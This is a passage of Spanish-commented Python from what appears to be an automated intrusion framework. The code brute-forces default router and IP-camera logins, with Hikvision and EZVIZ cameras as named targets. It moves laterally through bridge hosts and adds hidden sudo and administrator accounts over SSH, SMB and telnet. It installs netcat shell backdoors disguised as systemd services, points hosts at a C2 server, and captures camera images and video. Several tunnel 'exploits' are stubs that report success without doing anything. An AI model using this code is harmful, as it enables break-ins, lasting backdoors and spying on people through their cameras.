            print(f"     🌐 Explotando gateway adicional: {ip}:{port}")
            
            # Intentar credenciales comunes de router
            router_credentials = [
                {'username': 'admin', 'password': 'admin'},
                {'username': 'admin', 'password': 'password'},
                {'username': 'admin', 'password': '123456'},
                {'username': 'root', 'password': 'root'},
                {'username': 'admin', 'password': ''},
                {'username': 'administrator', 'password': 'administrator'}
            ]
            
            for creds in router_credentials:
                if self._test_router_credentials(ip, port, creds):
                    return {
                        'type': 'additional_gateway',
                        'ip': ip,
                        'port': port,
                        'credentials': creds,
                        'access_method': f"http://{creds['username']}:{creds['password']}@{ip}:{port}",
                        'exploited': True,
                        'timestamp': time.time()
                    }
            
            return None
            
        except Exception as e:
            print(f"     ❌ Error explotando gateway: {e}")
            return None
    
    def _exploit_multi_interface_host(self, host: Dict[str, Any], compromised_systems: List[Dict[str, Any]]) -> Optional[Dict[str, Any]]:
        """Explotar host multi-interfaz como puente"""
        try:
            primary_ip = host['primary_ip']
            additional_interfaces = host['additional_interfaces']
            
            print(f"     🔗 Explotando host multi-interfaz: {primary_ip}")
            
            # Verificar si ya tenemos acceso a este host
            has_access = any(sys['host'] == primary_ip for sys in compromised_systems)
            
            if has_access:
                # Si tenemos acceso, explorar las interfaces adicionales
                for interface_ip in additional_interfaces:
                    interface_access = self._explore_additional_interface(primary_ip, interface_ip)
                    if interface_access:
                        return {
                            'type': 'multi_interface_bridge',
                            'primary_ip': primary_ip,
                            'interface_ip': interface_ip,
                            'access_method': f"ssh {primary_ip} -> {interface_ip}",
                            'exploited': True,
                            'timestamp': time.time()
                        }
            
            return None
            
        except Exception as e:
            print(f"     ❌ Error explotando host multi-interfaz: {e}")
            return None
    
    def _exploit_tunnel_vpn(self, tunnel: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Explotar túnel o VPN"""
        try:
            host = tunnel['host']
            port = tunnel['port']
            service = tunnel['service']
            
            print(f"     🔒 Explotando túnel/VPN: {host}:{port} ({service})")
            
            # Intentar conectarse al túnel/VPN
            if service == 'openvpn':
                return self._exploit_openvpn_tunnel(host, port)
            elif 'pptp' in service:
                return self._exploit_pptp_tunnel(host, port)
            elif 'ipsec' in service:
                return self._exploit_ipsec_tunnel(host, port)
            
            return None
            
        except Exception as e:
            print(f"     ❌ Error explotando túnel/VPN: {e}")
            return None
    
    def _exploit_accessible_network(self, network: Dict[str, Any], compromised_systems: List[Dict[str, Any]]) -> Optional[Dict[str, Any]]:
        """Explotar red accesible a través de host puente"""
        try:
            bridge_host = network['bridge_host']
            accessible_routes = network['accessible_routes']
            
            print(f"     🌉 Explotando red accesible via: {bridge_host}")
            
            # Verificar si tenemos acceso al host puente
            has_bridge_access = any(sys['host'] == bridge_host for sys in compromised_systems)
            
            if has_bridge_access:
                # Intentar acceder a las rutas accesibles
                for route in accessible_routes:
                    route_access = self._explore_accessible_route(bridge_host, route)
                    if route_access:
                        return {
                            'type': 'accessible_network',
                            'bridge_host': bridge_host,
                            'accessible_route': route,
                            'access_method': f"ssh {bridge_host} -> {route}",
                            'exploited': True,
                            'timestamp': time.time()
                        }
            
            return None
            
        except Exception as e:
            print(f"     ❌ Error explotando red accesible: {e}")
            return None
    
    def _test_router_credentials(self, ip: str, port: int, credentials: Dict[str, str]) -> bool:
        """Probar credenciales de router"""
        try:
            import urllib.request
            import base64
            
            username = credentials['username']
            password = credentials['password']
            
            # Crear autenticación básica
            auth_string = f"{username}:{password}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Intentar acceder a la interfaz del router
            url = f"http://{ip}:{port}/"
            req = urllib.request.Request(url)
            req.add_header('Authorization', f'Basic {auth_b64}')
            req.add_header('User-Agent', 'Mozilla/5.0')
            
            with urllib.request.urlopen(req, timeout=5) as response:
                if response.status == 200:
                    content = response.read().decode('utf-8', errors='ignore').lower()
                    # Verificar que no es una página de login
                    if 'login' not in content and 'password' not in content:
                        return True
            
            return False
            
        except Exception:
            return False
    
    def _explore_additional_interface(self, primary_ip: str, interface_ip: str) -> bool:
        """Explorar interfaz adicional de un host"""
        try:
            # Simular exploración de interfaz adicional
            # En un entorno real, esto requeriría SSH al host primario
            print(f"       🔍 Explorando interfaz: {interface_ip}")
            
            # Verificar si la interfaz está accesible
            if self._is_port_open(interface_ip, 22):  # SSH
                return True
            elif self._is_port_open(interface_ip, 80):  # HTTP
                return True
            
            return False
            
        except Exception as e:
            print(f"       ❌ Error explorando interfaz: {e}")
            return False
    
    def _exploit_openvpn_tunnel(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Explotar túnel OpenVPN"""
        try:
            print(f"       🔒 Intentando conexión OpenVPN: {host}:{port}")
            
            # Simular conexión OpenVPN
            # En un entorno real, esto requeriría configuración de cliente
            return {
                'type': 'openvpn_tunnel',
                'host': host,
                'port': port,
                'access_method': f"openvpn --remote {host} {port}",
                'exploited': True,
                'timestamp': time.time()
            }
            
        except Exception as e:
            print(f"       ❌ Error explotando OpenVPN: {e}")
            return None
    
    def _exploit_pptp_tunnel(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Explotar túnel PPTP"""
        try:
            print(f"       🔒 Intentando conexión PPTP: {host}:{port}")
            
            # Simular conexión PPTP
            return {
                'type': 'pptp_tunnel',
                'host': host,
                'port': port,
                'access_method': f"pptp {host}",
                'exploited': True,
                'timestamp': time.time()
            }
            
        except Exception as e:
            print(f"       ❌ Error explotando PPTP: {e}")
            return None
    
    def _exploit_ipsec_tunnel(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Explotar túnel IPSec"""
        try:
            print(f"       🔒 Intentando conexión IPSec: {host}:{port}")
            
            # Simular conexión IPSec
            return {
                'type': 'ipsec_tunnel',
                'host': host,
                'port': port,
                'access_method': f"ipsec {host}",
                'exploited': True,
                'timestamp': time.time()
            }
            
        except Exception as e:
            print(f"       ❌ Error explotando IPSec: {e}")
            return None
    
    def _explore_accessible_route(self, bridge_host: str, route: str) -> bool:
        """Explorar ruta accesible a través de host puente"""
        try:
            print(f"       🌉 Explorando ruta: {route} via {bridge_host}")
            
            # Simular exploración de ruta
            # En un entorno real, esto requeriría SSH al host puente
            return True
            
        except Exception as e:
            print(f"       ❌ Error explorando ruta: {e}")
            return False
    
    def phase_4_persistence(self):
        """Fase 4: Persistencia y acceso remoto"""
        print("\n🔒 FASE 4: PERSISTENCIA Y ACCESO REMOTO")
        print("=" * 50)
        
        self.report['phase_4_persistence']['status'] = 'running'
        
        try:
            compromised = self.report['phase_3_lateral_movement']['compromised_systems']
            
            # 1. Crear usuarios persistentes
            print("👤 Creando usuarios persistentes...")
            users = self._create_persistent_users(compromised)
            self.report['phase_4_persistence']['users_created'] = users
            
            # 2. Crear backdoors
            print("🕳️ Creando backdoors...")
            backdoors = self._create_backdoors(compromised)
            self.report['phase_4_persistence']['backdoors_created'] = backdoors
            
            # 3. Establecer conexiones remotas
            print("🌐 Estableciendo conexiones remotas...")
            remote_conns = self._establish_remote_connections(compromised)
            self.report['phase_4_persistence']['remote_connections'] = remote_conns
            
            # 4. Configurar apuntadores C2
            print("🎯 Configurando apuntadores C2...")
            c2_pointers = self._setup_c2_pointers(compromised)
            self.report['phase_4_persistence']['c2_pointers'] = c2_pointers
            
            # 5. Acceder a cámaras detectadas (OBJETIVO DE ALTO VALOR)
            print("📹 Accediendo a cámaras detectadas...")
            cameras_accessed = self._access_detected_cameras()
            self.report['phase_4_persistence']['cameras_accessed'] = cameras_accessed
            
            # Log detallado de acceso a cámaras
            if cameras_accessed:
                print(f"✅ CÁMARAS ACCEDIDAS: {len(cameras_accessed)}")
                for camera in cameras_accessed:
                    print(f"   📹 {camera['host']}:{camera['port']} - {camera['camera_type']}")
                    print(f"      🔑 Credenciales: {camera['credentials']['username']}:{camera['credentials']['password']}")
                    if camera.get('screenshots'):
                        print(f"      📸 Screenshots capturados: {len(camera['screenshots'])}")
                    if camera.get('backdoor_info'):
                        print(f"      🕳️ Backdoor configurado: {camera['backdoor_info']['external_connection']['type']}")
            else:
                print("❌ No se pudo acceder a ninguna cámara")
            
            # 6. Acceder al router y configurar persistencia de red (OBJETIVO CRÍTICO)
            print("🌐 Accediendo al router y configurando persistencia de red...")
            router_access = self._access_router_and_configure_persistence()
            self.report['phase_4_persistence']['router_access'] = router_access
            
            # Log detallado de acceso al router
            if router_access:
                print(f"✅ ROUTER COMPROMETIDO: {len(router_access)}")
                for router in router_access:
                    print(f"   🌐 {router['gateway']} - {router['router_type']}")
                    print(f"      🔑 Credenciales: {router['credentials']['username']}:{router['credentials']['password']}")
                    config = router.get('configuration', {})
                    if config.get('port_forwarding'):
                        print(f"      🔗 Port forwarding configurado: {len(config['port_forwarding'])} reglas")
                    if config.get('vpn_server'):
                        print(f"      🔒 VPN configurada: {config['vpn_server']}")
                    if config.get('admin_user_created'):
                        print(f"      👤 Usuario admin creado: {config['admin_user_created']}")
            else:
                print("❌ No se pudo acceder al router")
            
            # 7. Configurar métodos de acceso remoto
            print("🔗 Configurando métodos de acceso remoto...")
            network_persistence = self._configure_network_persistence()
            self.report['phase_4_persistence']['network_persistence'] = network_persistence
            
            # Log detallado de persistencia de red
            if network_persistence:
                print(f"✅ PERSISTENCIA DE RED CONFIGURADA: {len(network_persistence)} servicios")
                for service in network_persistence:
                    print(f"   🔗 {service['service']} - Puerto: {service['port']}")
                    print(f"      🌐 IP Externa: {service['external_ip']}")
                    print(f"      📡 Comando: {service['reverse_command']}")
                    if service.get('process_id'):
                        print(f"      ⚙️ PID: {service['process_id']}")
                    if service.get('persistence_method'):
                        print(f"      🔄 Método: {service['persistence_method']}")
            else:
                print("❌ No se pudo configurar persistencia de red")
            
            # 8. Crear backdoors en servicios vulnerables
            print("🕳️ Creando backdoors en servicios vulnerables...")
            vulnerable_backdoors = self._create_vulnerable_service_backdoors()
            self.report['phase_4_persistence']['vulnerable_backdoors'] = vulnerable_backdoors
            
            # 9. Verificar backdoors externos
            print("🔍 Verificando backdoors externos...")
            external_backdoor_verification = self._verify_external_backdoors()
            self.report['phase_4_persistence']['external_backdoor_verification'] = external_backdoor_verification
            
            # Log detallado de verificación de backdoors
            if external_backdoor_verification:
                successful_backdoors = [bd for bd in external_backdoor_verification if bd.get('status') == 'active']
                print(f"✅ BACKDOORS EXTERNOS VERIFICADOS: {len(successful_backdoors)}/{len(external_backdoor_verification)} activos")
                for bd in successful_backdoors:
                    print(f"   🔗 {bd['service']} - Puerto: {bd['port']} - Estado: {bd['status']}")
                    if bd.get('connection_test'):
                        print(f"      ✅ Conexión verificada: {bd['connection_test']}")
            else:
                print("❌ No se pudieron verificar backdoors externos")
            
            self.report['phase_4_persistence']['status'] = 'completed'
            print(f"✅ Persistencia completada: {len(users)} usuarios, {len(backdoors)} backdoors")
            
        except Exception as e:
            self.report['phase_4_persistence']['status'] = 'error'
            self.report['phase_4_persistence']['errors'].append(str(e))
            print(f"❌ Error en persistencia: {e}")
    
    def _create_persistent_users(self, compromised: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Crear usuarios persistentes reales"""
        users = []
        
        for system in compromised:
            username = f'svc_{system["host"].replace(".", "_")}'
            password = f'P@ssw0rd_{system["host"].split(".")[-1]}!'
            
            # Intentar crear usuario real
            if self._create_real_user(system, username, password):
                user = {
                    'host': system['host'],
                    'username': username,
                    'password': password,
                    'groups': ['administrators', 'remote_desktop_users'],
                    'description': 'System Maintenance Service',
                    'created': True,
                    'timestamp': time.time()
                }
                users.append(user)
                print(f"✅ Usuario creado: {username}@{system['host']}")
            else:
                print(f"❌ Falló creación de usuario: {username}@{system['host']}")
        
        return users
    
    def _create_real_user(self, system: Dict[str, Any], username: str, password: str) -> bool:
        """Crear usuario real en el sistema"""
        try:
            if system['service'] == 'ssh':
                return self._create_user_via_ssh(system, username, password)
            elif system['service'] == 'smb':
                return self._create_user_via_smb(system, username, password)
            else:
                return self._create_user_generic(system, username, password)
        except Exception as e:
            print(f"❌ Error creando usuario real: {e}")
            return False
    
    def _create_user_via_ssh(self, system: Dict[str, Any], username: str, password: str) -> bool:
        """Crear usuario via SSH"""
        try:
            import paramiko
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                system['host'],
                port=system['port'],
                username=system['username'],
                password=system['password'],
                timeout=10
            )
            
            # Comandos para crear usuario (Linux/Unix)
            commands = [
                f"sudo useradd -m -s /bin/bash {username}",
                f"echo '{username}:{password}' | sudo chpasswd",
                f"sudo usermod -aG sudo {username}",
                f"sudo usermod -aG wheel {username}"
            ]
            
            for cmd in commands:
                stdin, stdout, stderr = ssh.exec_command(cmd)
                exit_status = stdout.channel.recv_exit_status()
                if exit_status != 0:
                    print(f"⚠️ Comando falló: {cmd}")
            
            ssh.close()
            return True
            
        except ImportError:
            # Fallback a comando ssh
            for cmd in commands:
                ssh_cmd = [
                    'ssh',
                    '-o', 'StrictHostKeyChecking=no',
                    f"{system['username']}@{system['host']}",
                    cmd
                ]
                result = self._run_command(ssh_cmd, timeout=15)
                if not result['success']:
                    print(f"⚠️ Comando SSH falló: {cmd}")
            return True
        except Exception as e:
            print(f"❌ Error SSH: {e}")
            return False
    
    def _create_user_via_smb(self, system: Dict[str, Any], username: str, password: str) -> bool:
        """Crear usuario via SMB (Windows)"""
        try:
            # Usar net user command via SMB
            net_cmd = [
                'smbclient',
                f"//{system['host']}/C$",
                '-U', f"{system['username']}%{system['password']}",
                '-c', f"net user {username} {password} /add && net localgroup administrators {username} /add"
            ]
            
            result = self._run_command(net_cmd, timeout=30)
            return result['success']
        except Exception as e:
            print(f"❌ Error SMB: {e}")
            return False
    
    def _create_user_generic(self, system: Dict[str, Any], username: str, password: str) -> bool:
        """Crear usuario genérico"""
        # Para otros servicios, intentar comandos básicos
        try:
            import telnetlib
            
            tn = telnetlib.Telnet(system['host'], system['port'], timeout=10)
            tn.read_until(b"login: ", timeout=5)
            tn.write(system['username'].encode('ascii') + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write(system['password'].encode('ascii') + b"\n")
            
            # Intentar crear usuario
            tn.write(f"useradd -m {username}\n".encode('ascii'))
            tn.write(f"passwd {username}\n".encode('ascii'))
            tn.write(f"{password}\n".encode('ascii'))
            tn.write(f"{password}\n".encode('ascii'))
            
            tn.close()
            return True
        except Exception as e:
            print(f"❌ Error genérico: {e}")
            return False
    
    def _create_backdoors(self, compromised: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Crear backdoors reales"""
        backdoors = []
        
        for system in compromised:
            port = 4444 + hash(system['host']) % 1000
            
            # Intentar crear backdoor real
            if self._create_real_backdoor(system, port):
                backdoor = {
                    'host': system['host'],
                    'type': 'netcat',
                    'port': port,
                    'method': 'reverse_shell',
                    'payload': f'nc -lvp {port} -e /bin/bash',
                    'created': True,
                    'timestamp': time.time()
                }
                backdoors.append(backdoor)
                print(f"✅ Backdoor creado: {system['host']}:{port}")
            else:
                print(f"❌ Falló creación de backdoor: {system['host']}:{port}")
        
        return backdoors
    
    def _create_real_backdoor(self, system: Dict[str, Any], port: int) -> bool:
        """Crear backdoor real en el sistema"""
        try:
            if system['service'] == 'ssh':
                return self._create_backdoor_via_ssh(system, port)
            else:
                return self._create_backdoor_generic(system, port)
        except Exception as e:
            print(f"❌ Error creando backdoor real: {e}")
            return False
    
    def _create_backdoor_via_ssh(self, system: Dict[str, Any], port: int) -> bool:
        """Crear backdoor via SSH"""
        try:
            import paramiko
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                system['host'],
                port=system['port'],
                username=system['username'],
                password=system['password'],
                timeout=10
            )
            
            # Crear script de backdoor
            backdoor_script = f"""#!/bin/bash
while true; do
    nc -lvp {port} -e /bin/bash
    sleep 5
done
"""
            
            # Escribir script
            stdin, stdout, stderr = ssh.exec_command(f"cat > /tmp/.service_{port}.sh << 'EOF'\n{backdoor_script}EOF")
            
            # Hacer ejecutable
            stdin, stdout, stderr = ssh.exec_command(f"chmod +x /tmp/.service_{port}.sh")
            
            # Crear servicio systemd
            service_content = f"""[Unit]
Description=System Service {port}
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.service_{port}.sh
Restart=always
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target
"""
            
            stdin, stdout, stderr = ssh.exec_command(f"cat > /etc/systemd/system/service_{port}.service << 'EOF'\n{service_content}EOF")
            
            # Habilitar y iniciar servicio
            stdin, stdout, stderr = ssh.exec_command("systemctl daemon-reload")
            stdin, stdout, stderr = ssh.exec_command(f"systemctl enable service_{port}.service")
            stdin, stdout, stderr = ssh.exec_command(f"systemctl start service_{port}.service")
            
            ssh.close()
            return True
            
        except ImportError:
            # Fallback a comando ssh
            commands = [
                f"cat > /tmp/.service_{port}.sh << 'EOF'\n{backdoor_script}EOF",
                f"chmod +x /tmp/.service_{port}.sh",
                f"cat > /etc/systemd/system/service_{port}.service << 'EOF'\n{service_content}EOF",
                "systemctl daemon-reload",
                f"systemctl enable service_{port}.service",
                f"systemctl start service_{port}.service"
            ]
            
            for cmd in commands:
                ssh_cmd = [
                    'ssh',
                    '-o', 'StrictHostKeyChecking=no',
                    f"{system['username']}@{system['host']}",
                    cmd
                ]
                result = self._run_command(ssh_cmd, timeout=15)
                if not result['success']:
                    print(f"⚠️ Comando SSH falló: {cmd}")
            return True
        except Exception as e:
            print(f"❌ Error SSH backdoor: {e}")
            return False
    
    def _create_backdoor_generic(self, system: Dict[str, Any], port: int) -> bool:
        """Crear backdoor genérico"""
        try:
            import telnetlib
            
            tn = telnetlib.Telnet(system['host'], system['port'], timeout=10)
            tn.read_until(b"login: ", timeout=5)
            tn.write(system['username'].encode('ascii') + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write(system['password'].encode('ascii') + b"\n")
            
            # Crear backdoor simple
            tn.write(f"nohup nc -lvp {port} -e /bin/bash &\n".encode('ascii'))
            
            tn.close()
            return True
        except Exception as e:
            print(f"❌ Error backdoor genérico: {e}")
            return False
    
    def _establish_remote_connections(self, compromised: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Establecer conexiones remotas"""
        connections = []
        
        for system in compromised:
            conn = {
                'host': system['host'],
                'type': 'ssh',
                'port': 22,
                'username': f'svc_{system["host"].replace(".", "_")}',
                'password': f'P@ssw0rd_{system["host"].split(".")[-1]}!',
                'persistent': True,
                'auto_reconnect': True,
                'timestamp': time.time()
            }
            connections.append(conn)
        
        return connections
    
    def _setup_c2_pointers(self, compromised: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Configurar apuntadores C2"""
        pointers = []
        
        for system in compromised:
            pointer = {
                'host': system['host'],
                'c2_server': '192.168.1.200',
                'c2_port': 8080,
                'checkin_interval': 300,  # 5 minutos
                'method': 'http_post',
                'encrypted': True,
                'timestamp': time.time()
            }
            pointers.append(pointer)
        
        return pointers
    
    def _access_detected_cameras(self) -> List[Dict[str, Any]]:
        """Acceder a cámaras detectadas en la red"""
        cameras_accessed = []
        
        # Buscar cámaras en servicios encontrados
        services = self.report['phase_1_reconnaissance']['services_found']
        cameras = self._identify_camera_services(services)
        
        for camera in cameras:
            print(f"📹 Procesando cámara: {camera['host']}:{camera['port']}")
            
            # Intentar acceso a la cámara
            camera_access = self._exploit_camera(camera)
            if camera_access:
                cameras_accessed.append(camera_access)
                print(f"✅ Acceso exitoso a cámara: {camera['host']}")
            else:
                print(f"❌ Falló acceso a cámara: {camera['host']}")
        
        return cameras_accessed
    
    def _identify_camera_services(self, services: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Identificar servicios que podrían ser cámaras"""
        cameras = []
        
        for service in services:
            # Verificar si es un puerto común de cámara
            if service['port'] in self.config['camera_ports']:
                # Verificar si el servicio sugiere que es una cámara
                service_name = service.get('service', '').lower()
                version = service.get('version', '').lower()
                
                camera_indicators = [
                    'http', 'https', 'rtsp', 'camera', 'ipcam', 'webcam',
                    'dvr', 'nvr', 'surveillance', 'security', 'monitor'
                ]
                
                if any(indicator in service_name or indicator in version for indicator in camera_indicators):
                    camera = {
                        'host': service['host'],
                        'port': service['port'],
                        'service': service['service'],
                        'version': service['version'],
                        'protocol': 'http' if service['port'] in [80, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 8888, 9999] else 'rtsp',
                        'detected_as_camera': True
                    }
                    cameras.append(camera)
                
                # También agregar si está en puertos específicos de cámaras
                elif service['port'] in [554, 1935]:  # RTSP, RTMP
                    camera = {
                        'host': service['host'],
                        'port': service['port'],
                        'service': service['service'],
                        'version': service['version'],
                        'protocol': 'rtsp',
                        'detected_as_camera': True
                    }
                    cameras.append(camera)
        
        return cameras
    
    def _exploit_camera(self, camera: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Explotar cámara específica"""
        try:
            # 1. Detectar tipo de cámara
            camera_type = self._detect_camera_type(camera)
            
            # 2. Intentar credenciales por defecto
            credentials = self._brute_force_camera_credentials(camera)
            
            if credentials:
                # 3. Obtener información de la cámara
                camera_info = self._get_camera_information(camera, credentials)
                
                # 4. Tomar screenshots de prueba
                screenshots = self._capture_camera_screenshots(camera, credentials)
                
                # 5. Descargar video de prueba (5 segundos o 100MB)
                video_file = self._download_camera_video(camera, credentials)
                
                # 6. Crear backdoor en la cámara
                backdoor_info = self._create_camera_backdoor(camera, credentials, camera_type)
                
                # 7. Generar URLs de acceso
                access_urls = self._generate_camera_urls(camera, credentials)
                
                return {
                    'host': camera['host'],
                    'port': camera['port'],
                    'protocol': camera['protocol'],
                    'camera_type': camera_type,
                    'credentials': credentials,
                    'camera_info': camera_info,
                    'screenshots': screenshots,
                    'video_file': video_file,
                    'backdoor_info': backdoor_info,
                    'access_urls': access_urls,
                    'timestamp': time.time()
                }
            
            return None
            
        except Exception as e:
            print(f"❌ Error explotando cámara {camera['host']}: {e}")
            return None
    
    def _detect_camera_type(self, camera: Dict[str, Any]) -> str:
        """Detectar tipo de cámara con enfoque específico en Hikvision/EZVIZ"""
        try:
            import urllib.request
            import urllib.error
            import urllib.parse
            
            host = camera['host']
            port = camera['port']
            
            # URLs específicas para detectar Hikvision/EZVIZ
            test_urls = [
                f"http://{host}:{port}/",
                f"http://{host}:{port}/doc/page/login.asp",
                f"http://{host}:{port}/ISAPI/System/deviceInfo",
                f"http://{host}:{port}/PSIA/System/deviceInfo",
                f"http://{host}:{port}/cgi-bin/snapshot.cgi",
                f"http://{host}:{port}/onvif/device_service",
                f"http://{host}:{port}/ezviz/deviceInfo"
            ]
            
            for url in test_urls:
                try:
                    req = urllib.request.Request(url)
                    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                    req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
                    
                    with urllib.request.urlopen(req, timeout=5) as response:
                        html_content = response.read().decode('utf-8', errors='ignore')
                        headers = dict(response.headers)
                        
                        # Detectar Hikvision/EZVIZ específicamente
                        if any(keyword in html_content.lower() for keyword in [
                            'hikvision', 'ezviz', 'hangzhou', 'hik-connect', 
                            'webcam', 'ip camera', 'network camera'
                        ]):
                            print(f"🎯 Detectada cámara Hikvision/EZVIZ en {host}:{port}")
                            return 'hikvision_ezviz'
                        
                        # Detectar por headers específicos
                        server_header = headers.get('Server', '').lower()
                        if any(keyword in server_header for keyword in [
                            'hikvision', 'ezviz', 'hangzhou'
                        ]):
                            print(f"🎯 Detectada cámara Hikvision/EZVIZ por header en {host}:{port}")
                            return 'hikvision_ezviz'
                        
                        # Detectar por URLs específicas
                        if '/doc/page/login.asp' in url and response.status == 200:
                            print(f"🎯 Detectada cámara Hikvision por URL de login en {host}:{port}")
                            return 'hikvision_ezviz'
                        
                        # Detectar otras marcas
                        if 'dahua' in html_content.lower():
                            return 'dahua'
                        elif 'axis' in html_content.lower():
                            return 'axis'
                        elif 'foscam' in html_content.lower():
                            return 'foscam'
                        elif 'dlink' in html_content.lower():
                            return 'dlink'
                        elif 'tp-link' in html_content.lower():
                            return 'tp-link'
                        elif 'xiaomi' in html_content.lower():
                            return 'xiaomi'
                            
                except Exception:
                    continue
            
            # Si no se detectó nada específico, intentar detección por puertos
            if port in [80, 8080, 8000, 554, 8554]:
                print(f"🎯 Cámara IP genérica detectada en {host}:{port}")
                return 'generic_ip_camera'
            
            return 'unknown'
                    
        except Exception as e:
            print(f"⚠️ No se pudo detectar tipo de cámara: {e}")
            return 'unknown'
    
    def _brute_force_camera_credentials(self, camera: Dict[str, Any]) -> Optional[Dict[str, str]]:
        """Fuerza bruta específica para cámaras con credenciales dirigidas"""
        try:
            import urllib.request
            import urllib.error
            import base64
            
            # Detectar tipo de cámara primero
            camera_type = self._detect_camera_type(camera)
            print(f"   🎯 Cámara detectada: {camera_type}")
            
            # Usar credenciales específicas según el tipo de cámara
            users_to_try = self.config['camera_users'].copy()
            passwords_to_try = self.config['camera_passwords'].copy()
            
            if 'ezviz' in camera_type.lower() or 'hikvision' in camera_type.lower():
                print("   🎯 Usando credenciales específicas para EZVIZ/Hikvision...")
                users_to_try.extend(self.config_data['credentials']['camera_users_ezviz'])
                passwords_to_try.extend(self.config_data['credentials']['camera_passwords_ezviz'])
            
            # Crear lista de credenciales para probar
            camera_credentials = []
            for username in users_to_try:
                for password in passwords_to_try:
                    camera_credentials.append((username, password))
            
            # URLs específicas para Hikvision/EZVIZ
            test_urls = [
                f"http://{camera['host']}:{camera['port']}/",
                f"http://{camera['host']}:{camera['port']}/doc/page/login.asp",
                f"http://{camera['host']}:{camera['port']}/ISAPI/System/deviceInfo",
                f"http://{camera['host']}:{camera['port']}/PSIA/System/deviceInfo",
                f"http://{camera['host']}:{camera['port']}/cgi-bin/snapshot.cgi",
                f"http://{camera['host']}:{camera['port']}/ezviz/deviceInfo"
            ]
            
            for username, password in camera_credentials:
                for url in test_urls:
                    try:
                        # Crear autenticación básica
                        auth_string = f"{username}:{password}"
                        auth_bytes = auth_string.encode('ascii')
                        auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
                        
                        req = urllib.request.Request(url)
                        req.add_header('Authorization', f'Basic {auth_b64}')
                        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                        req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
                        
                        with urllib.request.urlopen(req, timeout=5) as response:
                            if response.status == 200:
                                print(f"✅ Credenciales Hikvision/EZVIZ encontradas: {username}:{password}")
                                return {'username': username, 'password': password}
                                
                    except urllib.error.HTTPError as e:
                        if e.code == 401:  # Unauthorized
                            continue
                        elif e.code == 200:  # Success
                            print(f"✅ Credenciales Hikvision/EZVIZ encontradas: {username}:{password}")
                            return {'username': username, 'password': password}
                    except Exception:
                        continue
            
            # Si no funciona con credenciales específicas, probar las genéricas
            for username in self.config['camera_users']:
                for password in self.config['camera_passwords']:
                    try:
                        auth_string = f"{username}:{password}"
                        auth_bytes = auth_string.encode('ascii')
                        auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
                        
                        url = f"http://{camera['host']}:{camera['port']}/"
                        req = urllib.request.Request(url)
                        req.add_header('Authorization', f'Basic {auth_b64}')
                        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                        
                        with urllib.request.urlopen(req, timeout=5) as response:
                            if response.status == 200:
                                print(f"✅ Credenciales genéricas encontradas: {username}:{password}")
                                return {'username': username, 'password': password}
                                
                    except Exception:
                        continue
            
            return None
            
        except Exception as e:
            print(f"❌ Error en fuerza bruta de cámara: {e}")
            return None
    
    
    def _get_camera_information(self, camera: Dict[str, Any], credentials: Dict[str, str]) -> Dict[str, Any]:
        """Obtener información detallada de la cámara"""
        try:
            import urllib.request
            import base64
            import json
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            camera_info = {
                'model': 'unknown',
                'firmware': 'unknown',
                'resolution': 'unknown',
                'features': [],
                'capabilities': []
            }
            
            # Intentar obtener información de la página principal
            try:
                url = f"http://{camera['host']}:{camera['port']}/"
                req = urllib.request.Request(url)
                req.add_header('Authorization', f'Basic {auth_b64}')
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    html_content = response.read().decode('utf-8', errors='ignore')
                    
                    # Extraer información básica del HTML
                    if 'resolution' in html_content.lower():
                        camera_info['resolution'] = 'detected'
                    if 'ptz' in html_content.lower():
                        camera_info['features'].append('ptz')
                    if 'night' in html_content.lower() or 'ir' in html_content.lower():
                        camera_info['features'].append('night_vision')
                    if 'audio' in html_content.lower():
                        camera_info['features'].append('audio')
                    
            except Exception:
                pass
            
            # Intentar obtener información de API si está disponible
            api_endpoints = [
                '/api/system/deviceInfo',
                '/cgi-bin/magicBox.cgi?action=getDeviceType',
                '/cgi-bin/global.cgi',
                '/api/v1/device/info'
            ]
            
            for endpoint in api_endpoints:
                try:
                    url = f"http://{camera['host']}:{camera['port']}{endpoint}"
                    req = urllib.request.Request(url)
                    req.add_header('Authorization', f'Basic {auth_b64}')
                    
                    with urllib.request.urlopen(req, timeout=5) as response:
                        if response.status == 200:
                            content = response.read().decode('utf-8', errors='ignore')
                            
                            # Intentar parsear como JSON
                            try:
                                data = json.loads(content)
                                if 'model' in data:
                                    camera_info['model'] = data['model']
                                if 'firmware' in data:
                                    camera_info['firmware'] = data['firmware']
                            except:
                                # Si no es JSON, buscar en texto plano
                                if 'model' in content.lower():
                                    camera_info['model'] = 'detected'
                                if 'firmware' in content.lower():
                                    camera_info['firmware'] = 'detected'
                            
                            break
                            
